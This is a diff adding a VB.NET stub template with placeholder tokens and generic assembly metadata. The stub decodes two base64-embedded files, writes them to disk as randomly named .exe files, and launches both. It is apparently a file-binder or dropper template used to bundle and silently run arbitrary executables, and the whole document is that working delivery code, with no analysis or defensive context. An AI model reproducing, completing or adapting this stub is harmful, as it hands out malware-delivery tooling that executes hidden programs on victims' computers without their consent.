@@ -1,0 +1,75 @@
+
+Imports System.Reflection
+Imports System.Windows.Forms
+Imports System.Diagnostics.Process
+Imports System.Environment
+Imports System.Convert
+Imports System
+Imports System.Diagnostics
+Imports system.threading
+Imports Microsoft.VisualBasic
+
+
+<Assembly: AssemblyTitle("Title")> 
+<Assembly: AssemblyDescription("Description")> 
+<Assembly: AssemblyCompany("Company")> 
+<Assembly: AssemblyProduct("Product")> 
+<Assembly: AssemblyCopyright("Copyright")> 
+<Assembly: AssemblyTrademark("Trademark")>
+<Assembly: AssemblyVersion("1.0.0.0")> 
+<Assembly: AssemblyFileVersion("1.0.0.0")>
+
+Module Client
+
+
+Sub Main()
+
+
+  Dim %file1CodedBytes%  As String = %file1%
+
+  Dim %file2CodedBytes%  As String = %file2%
+
+  Dim %file1Bytes%() As Byte = Convert.FromBase64String(%file1CodedBytes%)
+
+  Dim %file2Bytes%() As Byte = Convert.FromBase64String(%file2CodedBytes%)
+
+  Dim %FileName1% as string = "\" & random_key(5) & ".exe"
+
+  Dim %FileName2% as string =  "\" & random_key(5) & ".exe"
+
+  IO.File.WriteAllBytes(Environment.CurrentDirectory & %FileName1%, %file1Bytes%)
+
+  IO.File.WriteAllBytes(Environment.CurrentDirectory & %FileName2%, %file2Bytes%)
+
+  Process.Start(Environment.CurrentDirectory & %FileName1%)
+
+  Process.Start(Environment.CurrentDirectory & %FileName2%)
+
+
+
+
+    End Sub
+
+    Public Function random_key(ByVal lenght As Integer) As String
+
+        Randomize()
+
+        Dim s As New System.Text.StringBuilder("")
+
+        Dim b() As Char = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
+
+        For i As Integer = 1 To lenght
+
+            Randomize()
+
+            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
+
+            s.Append(b(z))
+
+        Next
+
+        Return s.ToString
+
+    End Function
+
+End Module
